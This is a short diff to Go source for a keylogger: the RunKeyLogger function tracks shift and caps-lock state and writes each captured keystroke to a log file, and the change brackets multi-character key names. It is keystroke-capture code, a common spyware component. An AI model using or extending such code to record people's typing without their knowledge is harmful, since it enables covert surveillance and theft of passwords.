@@ -1,6 +1,9 @@
 package main
 
-import "log"
+import (
+	"fmt"
+	"log"
+)
 
 var (
 	shift bool
@@ -33,9 +36,15 @@ func RunKeyLogger() {
 				} else if ie.Code == 58 && caps == true {
 					caps = false
 				}
-				log.Print(ie.KeyString(shift, caps))
-				_, err = logfile.WriteString(ie.KeyString(shift, caps))
-				checkErr(err)
+				k := ie.KeyString(shift, caps)
+				log.Print(k)
+				if len(k) > 1 {
+					_, err = logfile.WriteString(fmt.Sprint("[", k, "]"))
+					checkErr(err)
+				} else {
+					_, err = logfile.WriteString(k)
+					checkErr(err)
+				}
 				logfile.Sync()
 			} else if ie.Value == 0 && (ie.Code == 42 || ie.Code == 54) {
 				if shift {
